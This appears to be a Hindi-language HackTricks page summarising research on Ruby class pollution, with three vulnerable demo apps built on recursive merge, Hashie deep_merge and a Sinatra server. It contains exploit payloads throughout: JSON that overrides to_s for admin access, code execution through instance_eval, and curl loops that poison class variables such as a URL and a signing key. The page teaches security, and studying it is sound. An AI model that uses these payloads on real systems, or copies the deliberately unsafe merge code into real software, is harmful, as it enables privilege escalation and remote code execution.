# Ruby Class Pollution

{{#include ../../banners/hacktricks-training.md}}

यह पोस्ट का सारांश है [https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html](https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html)

## एट्रिब्यूट्स पर मर्ज

उदाहरण:
```ruby
# Code from https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html
# Comments added to exploit the merge on attributes
require 'json'


# Base class for both Admin and Regular users
class Person

attr_accessor :name, :age, :details

def initialize(name:, age:, details:)
@name = name
@age = age
@details = details
end

# Method to merge additional data into the object
def merge_with(additional)
recursive_merge(self, additional)
end

# Authorize based on the `to_s` method result
def authorize
if to_s == "Admin"
puts "Access granted: #{@name} is an admin."
else
puts "Access denied: #{@name} is not an admin."
end
end

# Health check that executes all protected methods using `instance_eval`
def health_check
protected_methods().each do |method|
instance_eval(method.to_s)
end
end

private

# VULNERABLE FUNCTION that can be abused to merge attributes
def recursive_merge(original, additional, current_obj = original)
additional.each do |key, value|

if value.is_a?(Hash)
if current_obj.respond_to?(key)
next_obj = current_obj.public_send(key)
recursive_merge(original, value, next_obj)
else
new_object = Object.new
current_obj.instance_variable_set("@#{key}", new_object)
current_obj.singleton_class.attr_accessor key
end
else
current_obj.instance_variable_set("@#{key}", value)
current_obj.singleton_class.attr_accessor key
end
end
original
end

protected

def check_cpu
puts "CPU check passed."
end

def check_memory
puts "Memory check passed."
end
end

# Admin class inherits from Person
class Admin < Person
def initialize(name:, age:, details:)
super(name: name, age: age, details: details)
end

def to_s
"Admin"
end
end

# Regular user class inherits from Person
class User < Person
def initialize(name:, age:, details:)
super(name: name, age: age, details: details)
end

def to_s
"User"
end
end

class JSONMergerApp
def self.run(json_input)
additional_object = JSON.parse(json_input)

# Instantiate a regular user
user = User.new(
name: "John Doe",
age: 30,
details: {
"occupation" => "Engineer",
"location" => {
"city" => "Madrid",
"country" => "Spain"
}
}
)


# Perform a recursive merge, which could override methods
user.merge_with(additional_object)

# Authorize the user (privilege escalation vulnerability)
# ruby class_pollution.rb '{"to_s":"Admin","name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
user.authorize

# Execute health check (RCE vulnerability)
# ruby class_pollution.rb '{"protected_methods":["puts 1"],"name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
user.health_check

end
end

if ARGV.length != 1
puts "Usage: ruby class_pollution.rb 'JSON_STRING'"
exit
end

json_input = ARGV[0]
JSONMergerApp.run(json_input)
```
### व्याख्या

1. **Privilege Escalation**: `authorize` मेथड यह जांचता है कि `to_s` "Admin" लौटाता है। JSON के माध्यम से नया `to_s` attribute इंजेक्ट करके, एक attacker `to_s` मेथड को "Admin" लौटाने के लिए मजबूर कर सकता है, जिससे अनाधिकृत अधिकार प्राप्त हो जाते हैं।
2. **Remote Code Execution**: `health_check` में `instance_eval` उन मेथड्स को execute करता है जो `protected_methods` में सूचीबद्ध हैं। अगर कोई attacker custom method names (जैसे `"puts 1"`) इंजेक्ट करता है, तो `instance_eval` उसे execute कर देगा, जिससे **remote code execution (RCE)** हो सकता है।
1. यह सिर्फ इसलिए संभव है क्योंकि वहां एक **vulnerable `eval` instruction** है जो उस attribute के string value को execute कर रहा है।
3. **Impact Limitation**: यह vulnerability केवल व्यक्तिगत instances को प्रभावित करती है, अन्य `User` और `Admin` instances अप्रभावित रहते हैं, इस तरह exploitation का scope सीमित रहता है।

### वास्तविक दुनिया के मामले <a href="#real-world-cases" id="real-world-cases"></a>

### ActiveSupport’s `deep_merge`

यह डिफ़ॉल्ट रूप से vulnerable नहीं है लेकिन इसे कुछ इस तरह vulnerable बनाया जा सकता है:
```ruby
# Method to merge additional data into the object using ActiveSupport deep_merge
def merge_with(other_object)
merged_hash = to_h.deep_merge(other_object)

merged_hash.each do |key, value|
self.class.attr_accessor key
instance_variable_set("@#{key}", value)
end

self
end
```
### Hashie’s `deep_merge`

Hashie’s `deep_merge` मेथड सीधे object attributes पर काम करता है, न कि plain hashes पर। यह **methods को attributes से बदलने** से रोकता है merge में कुछ **exceptions** के साथ: ऐसे attributes जो `_`, `!`, या `?` पर खत्म होते हैं, उन्हें फिर भी object में merge किया जा सकता है।

एक खास मामला attribute **`_`** खुद में है। सिर्फ `_` एक attribute है जो आमतौर पर एक `Mash` object लौटाता है। और क्योंकि यह **exceptions** का हिस्सा है, इसे modify करना संभव है।

निम्न उदाहरण देखें — कैसे `{"_": "Admin"}` पास करने पर `_.to_s == "Admin"` bypass किया जा सकता है:
```ruby
require 'json'
require 'hashie'

# Base class for both Admin and Regular users
class Person < Hashie::Mash

# Method to merge additional data into the object using hashie
def merge_with(other_object)
deep_merge!(other_object)
self
end

# Authorize based on to_s
def authorize
if _.to_s == "Admin"
puts "Access granted: #{@name} is an admin."
else
puts "Access denied: #{@name} is not an admin."
end
end

end

# Admin class inherits from Person
class Admin < Person
def to_s
"Admin"
end
end

# Regular user class inherits from Person
class User < Person
def to_s
"User"
end
end

class JSONMergerApp
def self.run(json_input)
additional_object = JSON.parse(json_input)

# Instantiate a regular user
user = User.new({
name: "John Doe",
age: 30,
details: {
"occupation" => "Engineer",
"location" => {
"city" => "Madrid",
"country" => "Spain"
}
}
})

# Perform a deep merge, which could override methods
user.merge_with(additional_object)

# Authorize the user (privilege escalation vulnerability)
# Exploit: If we pass {"_": "Admin"} in the JSON, the user will be treated as an admin.
# Example usage: ruby hashie.rb '{"_": "Admin", "name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
user.authorize
end
end

if ARGV.length != 1
puts "Usage: ruby hashie.rb 'JSON_STRING'"
exit
end

json_input = ARGV[0]
JSONMergerApp.run(json_input)
```
> **Hashie deep_merge mutation regression (2025):** Hashie 5.0.0 में, `Hashie::Extensions::DeepMerge#deep_merge` रिसीवर पर nested sub-hashes को duplicate करने की बजाय mutate कर देता था। हमलावर-नियंत्रित डेटा को दीर्घकालिक ऑब्जेक्ट्स में merge करने पर ये परिवर्तन अनुरोधों के बीच स्थायी रह सकते थे, जिससे पहले “सुरक्षित” instances प्रदूषित हो जाते थे। इस व्यवहार को 5.0.1 में सुधारा गया था।

## क्लासेस को विषाक्त करें <a href="#escaping-the-object-to-poison-the-class" id="escaping-the-object-to-poison-the-class"></a>

निम्नलिखित उदाहरण में **`Person`** क्लास और **`Person`** से विरासत में मिली **`Admin`** तथा **`Regular`** क्लासेस को ढूंढना संभव है। इसमें **`KeySigner`** नाम की एक और क्लास भी है:
```ruby
require 'json'
require 'sinatra/base'
require 'net/http'

# Base class for both Admin and Regular users
class Person
@@url = "http://default-url.com"

attr_accessor :name, :age, :details

def initialize(name:, age:, details:)
@name = name
@age = age
@details = details
end

def self.url
@@url
end

# Method to merge additional data into the object
def merge_with(additional)
recursive_merge(self, additional)
end

private

# Recursive merge to modify instance variables
def recursive_merge(original, additional, current_obj = original)
additional.each do |key, value|
if value.is_a?(Hash)
if current_obj.respond_to?(key)
next_obj = current_obj.public_send(key)
recursive_merge(original, value, next_obj)
else
new_object = Object.new
current_obj.instance_variable_set("@#{key}", new_object)
current_obj.singleton_class.attr_accessor key
end
else
current_obj.instance_variable_set("@#{key}", value)
current_obj.singleton_class.attr_accessor key
end
end
original
end
end

class User < Person
def initialize(name:, age:, details:)
super(name: name, age: age, details: details)
end
end

# A class created to simulate signing with a key, to be infected with the third gadget
class KeySigner
@@signing_key = "default-signing-key"

def self.signing_key
@@signing_key
end

def sign(signing_key, data)
"#{data}-signed-with-#{signing_key}"
end
end

class JSONMergerApp < Sinatra::Base
# POST /merge - Infects class variables using JSON input
post '/merge' do
content_type :json
json_input = JSON.parse(request.body.read)

user = User.new(
name: "John Doe",
age: 30,
details: {
"occupation" => "Engineer",
"location" => {
"city" => "Madrid",
"country" => "Spain"
}
}
)

user.merge_with(json_input)

{ status: 'merged' }.to_json
end

# GET /launch-curl-command - Activates the first gadget
get '/launch-curl-command' do
content_type :json

# This gadget makes an HTTP request to the URL stored in the User class
if Person.respond_to?(:url)
url = Person.url
response = Net::HTTP.get_response(URI(url))
{ status: 'HTTP request made', url: url, response_body: response.body }.to_json
else
{ status: 'Failed to access URL variable' }.to_json
end
end

# Curl command to infect User class URL:
# curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"url":"http://example.com"}}}' http://localhost:4567/merge

# GET /sign_with_subclass_key - Signs data using the signing key stored in KeySigner
get '/sign_with_subclass_key' do
content_type :json

# This gadget signs data using the signing key stored in KeySigner class
signer = KeySigner.new
signed_data = signer.sign(KeySigner.signing_key, "data-to-sign")

{ status: 'Data signed', signing_key: KeySigner.signing_key, signed_data: signed_data }.to_json
end

# Curl command to infect KeySigner signing key (run in a loop until successful):
# for i in {1..1000}; do curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"superclass":{"subclasses":{"sample":{"signing_key":"injected-signing-key"}}}}}}' http://localhost:4567/merge; done

# GET /check-infected-vars - Check if all variables have been infected
get '/check-infected-vars' do
content_type :json

{
user_url: Person.url,
signing_key: KeySigner.signing_key
}.to_json
end

run! if app_file == $0
end
```
### Poison Parent Class

इस payload के साथ:
```bash
curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"url":"http://malicious.com"}}}' http://localhost:4567/merge
```
Parent class **`Person`** के **`@@url`** attribute का मान संशोधित करना संभव है।

### **Poisoning Other Classes**

इस payload के साथ:
```bash
for i in {1..1000}; do curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"superclass":{"subclasses":{"sample":{"signing_key":"injected-signing-key"}}}}}}' http://localhost:4567/merge --silent > /dev/null; done
```
परिभाषित classes को brute-force करना संभव है और किसी बिंदु पर class **`KeySigner`** को poison करके `signing_key` का मान `injected-signing-key` से बदल दिया जा सकता है।\

## संदर्भ

- [https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html](https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html)
- [https://ruby.libhunt.com/hashie-latest-version](https://ruby.libhunt.com/hashie-latest-version)

{{#include ../../banners/hacktricks-training.md}}
